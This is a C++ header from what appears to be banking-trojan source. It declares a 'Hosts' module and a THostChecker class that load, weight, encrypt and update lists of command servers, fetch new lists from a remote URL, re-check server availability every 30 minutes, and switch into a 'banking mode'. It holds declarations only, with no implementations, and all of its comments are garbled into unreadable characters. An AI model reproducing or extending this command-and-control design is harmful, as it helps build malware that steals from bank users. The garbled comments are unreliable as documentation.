//---------------------------------------------------------------------------
//  ������ ��� ������ � �������
//---------------------------------------------------------------------------


#ifndef BotHostsH
#define BotHostsH
//---------------------------------------------------------------------------

#include "windows.h"
#include "BotClasses.h"


//----------------------------------------------------
//  ���� ������ ������
//----------------------------------------------------
#define HOSTS_WEIGHT_DEFAULT  0
#define HOSTS_WEIGHT_LOW      1
#define HOSTS_WEIGHT_MIDDLE   100
#define HOSTS_WEIGHT_HIGH     500



//----------------------------------------------------
//  ������ ������
//----------------------------------------------------
typedef struct THostList
{
	DWORD Weight;  // ��� (���������) ������
    PList Items;   // ������ ��������� (PHost)
} *PHostList;



//----------------------------------------------------
//  �������� �����
//----------------------------------------------------
typedef DWORD HOSTTIME;

typedef struct THost
{
	DWORD     Status;     // ������ �����
	HOSTTIME  CheckTime;  // ����� ��������� �������� �����
    PCHAR     Host;       // ����� �����
} *PHost;


//****************************************************************************
//  Hosts - ������ ��� ������ � ������� ����
//          � ������ ������ �������� ����� ���������� ������ "�������"
//			���� ��������� ����� ���������� ������ ��� ����������, �� �������
//			������� ���� ���� nobnk.list. ���� ������� ����� �������, �� ����� �������
//			������ ���� bnk.list
//****************************************************************************
namespace Hosts
{
	//----------------------------------------------------------------
	//  GetFileName - ������� ���������� ��� ����� ��������� ������
	//				  ������ ����
	//----------------------------------------------------------------
    PCHAR GetFileName();

	//----------------------------------------------------------------
	//  GetActiveHostFormMainList -  ������� ���������� ������
	//       ��������� ���� �� ��������� ������ ������ ��������
	//		 �� �����
	//
	//  FileName - ��� ����� ������. ���� �������� NULL �� �����
	//			   �������������� ���� � ������ ������� ����������
	//			   ������� GetFileName
	//
	//  Host - ����������, ���� ����� ������� ����
	//         � ������ ������ ������� ������� ������
	//
	//  ���������: ������� ������ ������ ���� �� ������� ���������
	//  		   ������ � ����� � � ��� ���������� ����-�� ����
	//             ����
	//----------------------------------------------------------------
    bool GetActiveHostFormFile(PCHAR FileName, PCHAR &Host);

	//----------------------------------------------------------------
	//  CheckHost - ������� ��������� ����������������� ����� �
	//              ���������� ������ � ������ ������
	//----------------------------------------------------------------
    bool CheckHost(PCHAR Host);

	//----------------------------------------------------------------
	//  CreateList - ������� ������ ������ ������.
	//----------------------------------------------------------------
	PHostList CreateList();

	//----------------------------------------------------------------
	//  FreeList - ������� ���������� ������ ������
	//----------------------------------------------------------------
    void FreeList(PHostList List);

	//----------------------------------------------------------------
	//  ClearList - ������� ������� ������ ������
	//----------------------------------------------------------------
    void ClearList(PHostList List);

	//----------------------------------------------------------------
	//  AddHost - �������� ����� ���� � ������
	//----------------------------------------------------------------
	PHost AddHost(PHostList List, PCHAR Host);
	PHost AddHost(PHostList List, const string &Host);

	//----------------------------------------------------------------
	//  SaveListToFile - ������� ��������� ������ ������ � ����.
	//		���� ���� ��� ����������, �� ������ ��������� ��� ������
	//		�� ����� � ����	�� ������ ���� ������������ ������, ��
	//		������� ������ ���� ������
	//
	//  List - ����������� ������
	//
	//  FileName - ��� �����, ���� ���������� ��������� ������
	//
	//  IgnoreWeight - �������� ������������ ��� ������ �� �����
	//
	//  ���������: ������� ������ ������ � ������ �������� ������
	//----------------------------------------------------------------
	bool SaveListToFile(PHostList List, PCHAR FileName, bool IgnoreWeight);

	//----------------------------------------------------------------
	//  LoadListFromFile - ������� ��������� ������ ������ �� �����
	//
	//  List - ������, ���� ����� ��������� ������ �� �����
	//
	//  FileName - ��� ����� ������
	//
	//  ���������: ������� ������ ������ � ������ �������� ��������
	//----------------------------------------------------------------
	bool LoadListFromFile(PHostList List, PCHAR FileName);


	//----------------------------------------------------------------
	//  ������� ���������� ��� ������ ����������� � ����
	//----------------------------------------------------------------
	bool GetListWeight(HANDLE File, DWORD &Weight);

	//----------------------------------------------------------------
	//  UpdateHosts - ������� ��������� ������ ������ � ��������� ����
	//                �� �����
	//
	//  Args - ��� ������ ������.
	//		   ����������� ��������� ��������:
	//			1. ������ ����� ������.
	//			   �������� UpdateHosts("http://dm.com/hosts.list");
	//
	//		    2. �������� ��� ����� ������� (�������). � ���� ������
	//			   ���� ����� �������� ����� ������� �������� ��������
	//			   ��������: UpdateHosts("mainhosts.list");
	//----------------------------------------------------------------
    bool UpdateHosts(PCHAR Args);

	//----------------------------------------------------------------
	//  ExecuteUpdateHostsCommand - ������� ��������� �������
	//							   ���������� ������ ������
	//----------------------------------------------------------------
	bool ExecuteUpdateHostsCommand(LPVOID TaskManager, PCHAR Command, PCHAR Args);

	//----------------------------------------------------------------
	//  SetBankingMode - ������� �������� ������������� ������ ���
	//  				 ������� ������� ������� �������
	//----------------------------------------------------------------
    void SetBankingMode();

}


//----------------------------------------------------
//  THostChecker - ������� ������ �������� �����
//----------------------------------------------------

const DWORD HostCheckInterval = 1800000; /* ��������� �������� ��� � 30 ����� */

class THostChecker : public TBotObject
{
private:
	PList FHosts;
	string FWorkHost;
	DWORD FCheckTime;
	HANDLE FThread;
    bool FTerminated;
	friend DWORD WINAPI HostCheckerThreadProc(THostChecker *Checker);

	void DoCheckHosts();
public:
	string FirstHost;
	// �� ���� ������������ ����� ������ ����������
	// �������� ��������� � �������������� ������ �������
	// "host1\0host2\0\0"
	THostChecker(const char *Hosts, bool HostsEncrypted);
	~THostChecker();
	void Check(bool ReCheck = false);
    string GetWorkHost();
};



//---------------------------------------------------------------------------
#endif
